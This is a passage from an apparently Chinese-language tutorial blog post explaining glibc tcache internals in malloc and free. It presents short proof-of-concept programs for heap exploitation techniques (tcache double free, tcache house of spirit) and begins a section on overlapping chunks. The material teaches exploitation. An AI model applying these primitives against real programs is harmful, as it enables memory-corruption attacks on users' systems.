*fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)   <span class="comment">// 把该 fastbin 里面其他的 bin 放到 tcache 里面</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">// 判断 tcache 中指定 bin 中 chunk 是否超过 7</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>在 相应 <code>fastbin</code> 找到 合适的 <code>chunk</code> 后，就把 该 <code>chunk</code> 从 <code>fastbin</code> 里面拿下来</li><li>然后 把相应 <code>fastbin</code> 里面剩下的 <code>chunk</code> 全都放到 <code>tcache</code> 里面 ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满了 (已经有 <code>7</code> 个 <code>chunk</code> 了，即 <code>tcache-&gt;counts[tc_idx] = mp_.tcache_count = 7</code> ）。</li><li>最后在返回一开始拿到的 <code>chunk</code> 给用户</li></ul><p>如果 <code>fastbin</code> 不能分配，则进入 <code>smallbin</code> 的分配流程</p><h4 id="处理-smallbin"><a href="#处理-smallbin" class="headerlink" title="处理 smallbin"></a>处理 smallbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = bin;  <span class="comment">// 找到 chunk ， 从 smallbin拿下来准备返回给用户</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size, // 把指定 smallbin 里面的 bin扔到 tcache里面</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>和 <code>fastbin</code> 是类似的操作， 在 <code>size</code> 对应的 <code>smallbin</code> 里面找到 <code>chunk</code> 后</p><p>把这个 <code>chunk</code> 从链表上取下来</p><p>然后把该 <code>smallbin</code> 里面剩下的 <code>bin</code> 放入到 <code>tcache</code> ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满.</p><p>如果 <code>smallbin</code> 也没能分配，进入 <code>unsorted bin</code></p><h4 id="遍历unsorted-bin"><a href="#遍历unsorted-bin" class="headerlink" title="遍历unsorted bin"></a>遍历unsorted bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          <span class="comment">// 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">     <span class="comment">// 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历</span></span><br><span class="line"> We may <span class="keyword">return</span> one of these chunks later.  */</span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。</span></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">//如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit &gt; 0 默认为 0 ，不会进入分支, 继续遍历 </span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         &#125; <span class="comment">// end of  while ((victim = unsorted_chunks (av)-&gt;b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>在遍历 <code>unsorted bin</code> 的时候， 如果找到大小刚好满足的 <code>bin</code> ， 不会立刻返回，而是把这个 <code>bin</code> 放入 <code>tcache</code> 里面，并且设置 <code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code></li><li>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面</li><li>遍历 <code>unsorted bin</code> 的最后，会根据 <code>return_cached</code> 判断是否有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code> ， <code>mp_.tcache_unsorted_limit</code> 默认为 <code>0</code> ，所以不会进入分支， 这样就会把所有的 <code>unsorted bin</code> 都放入到 <code>tcache</code>。</li><li>遍历完 <code>unsorted bin</code> 后 ，根据 <code>return_cached</code> 判断 <code>tcache</code> 里面是否有合适的 <code>chunk</code> ，有的话就可以返回了</li><li>否则 <code>large bin</code> ，<code>top chunk</code> 来分配</li></ul><h2 id="tcache-in-free"><a href="#tcache-in-free" class="headerlink" title="tcache in free"></a>tcache in free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>删掉了一些没影响的代码</p><ul><li>首先就是获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就看 <code>tcache-&gt;counts[tc_idx]</code> 是否已经满了 ，如果没有满就直接放入 <code>tcache</code> ， 然后返回。</li><li>否则就和没有 <code>tcache</code> 是一样的处理</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk( next )</code> 的 <code>PREV_INUSE</code> 位，但是如果 <code>chunk</code> 被放入了 tcache ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">// 通过下一个 chunk 的 pre_inused 位，判断当前 chunk 释放已经被释放</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);  <span class="comment">// 如果 chunk 被放入了 tcache ，next-&gt;pre_inuse 不会被修改。</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>同时在 <code>malloc</code> 的时候 ，先尝试 <code>tcache</code> 分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这也使得很多安全检测不会被执行。</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>通过 <code>free</code> 2次同一个 <code>chunk</code> ， 使得可以让两个指针分配到同一块内存</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Next allocated memory will be same: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过 <code>_int_free</code> 的源码我们知道， 在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk</code> ( <code>next</code> ) 的 <code>PREV_INUSE</code> 位</li><li>然后如果 <code>tcache</code> 指定项没有满就把 <code>chunk</code> 加入 <code>tcache</code></li><li>但是如果 <code>chunk</code> 被放入了 <code>tcache</code> ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></li></ul><p>所以我们释放两次 <code>p1</code> , 此时 <code>tcache</code> 里面 <code>size</code> 为 <code>0x50</code> ( <code>chunk</code> 大小) 的项中就有 两个 一样 <code>chunk</code></p><p>然后分配两次一样大小的 <code>chunk</code>， <code>malloc</code> 会先用 <code>tcache</code> 分配，就会拿到两个一样的 <code>chunk</code></p><p>可以看到分配到了两个地址一样的 <code>chunk</code> .</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>通过伪造 <code>size</code> ，然后 <code>free</code> 掉这个 伪造的 <code>chunk</code> , 然后再分配 <code>size</code> 大小的 <code>chunk</code> , 就可以分配到指定位置。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>首先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk_and_more[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk_and_more, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(fake_chunk_and_more));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack buf: %p\n"</span>, (<span class="keyword">void</span> *)fake_chunk_and_more);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* fake_chunk = (<span class="keyword">char</span> * )fake_chunk_and_more;</span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="number">0x110</span> + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x40</span>;  <span class="comment">// 设置 pre_inused 位</span></span><br><span class="line">    <span class="keyword">char</span> *mem = fake_chunk + <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100) returned: %p\n"</span>, mem2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是在栈上面（用栈只是为了方便）伪造了 一个 <code>0x110</code> 大小 <code>chunk</code>，</p><p>然后把它释放掉，他就会进入 <code>tcache</code> ,然后分配 <code>0x110</code> 的 <code>chunk</code> 就可以 分配到 <code>fake_chunk_and_more</code> 的地址</p><p>可以看到分配到了<code>fake_chunk_and_more</code> .</p><p>调试过程的内存状态</p><p>熟悉 <code>malloc</code> 管理机制的老哥们可以比较奇怪，这里把 <code>next_chunk-&gt;pre_inused = 0</code> ( <code>size = 0x40</code> ) 。</p><p>在 源码里面是有通过 <code>check_inuse_chunk</code> 检测是否 <code>double free</code> 的 代码的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  ....................................................</span><br><span class="line">  ....................................................</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但是从 <code>ida</code> 里面去看，居然不见了，校验 <code>chunk</code> 的 <code>size</code> 和 指针 后就直接进入 <code>tcache</code> 的处理的流程， 于是这里就算设置 下一个<code>chunk</code> 的 <code>next_chunk-&gt;pre_inuse = 0</code> ,也不会出现 <code>crash</code> 。</p><h2 id="overlapping-chunks-by-caching"><a href="#overlapping-chunks-by-caching" class="headerlink" title="overlapping_chunks_by_caching"></a>overlapping_chunks_by_caching</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><code>overlapping_chunks</code> 这种技术非常经典了， 不过在 <code>tcache</code> 里面就非常的简单了， 修改 <code>chunk</code> 的 <code>size</code> 为 <code>fake_size</code> ， 然后 <code>free</code> 掉它，就会进入 <code>fake_size</code> 对应的 <code>tcache</code> ， 然后在 分配 <code>fake_size</code> 的 <code>chunk</code> 就可以拿到这个 <code>chunk</code> , <strong>overlap chunk</strong></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 